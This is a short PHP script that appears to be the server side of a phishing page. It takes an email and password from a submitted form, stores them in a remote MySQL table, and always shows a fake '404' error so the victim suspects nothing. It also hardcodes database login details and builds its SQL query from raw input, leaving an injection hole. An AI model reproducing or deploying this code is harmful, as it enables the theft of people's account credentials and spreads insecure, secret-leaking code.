<?php

//Create a conection with database
$con = mysqli_connect("sql102.epizy.com", "epiz_31641649", "wqa8pTiJNK", "epiz_31641649_userdata");

//Set Variebles for the input
$maail = $_POST['mail'];
$paassward = $_POST['pasward'];

//Create a MySQL command to INSERT data into data table
$sql = "INSERT INTO userdata(mail, pass) VALUES ('$maail', '$paassward')";
$result = mysqli_query($con, $sql);

//Now Insert data into database
//Check if data is inserted or not
if (!mysqli_query($con, $sql)) {
	echo "<h1>Error! 404</h1><br><h4> Try again later </h4>";
} else{
	echo "<h1>Error! 404</h1><br><h4> Try again later </h4>";
}
?>
<!-- byetcluster -->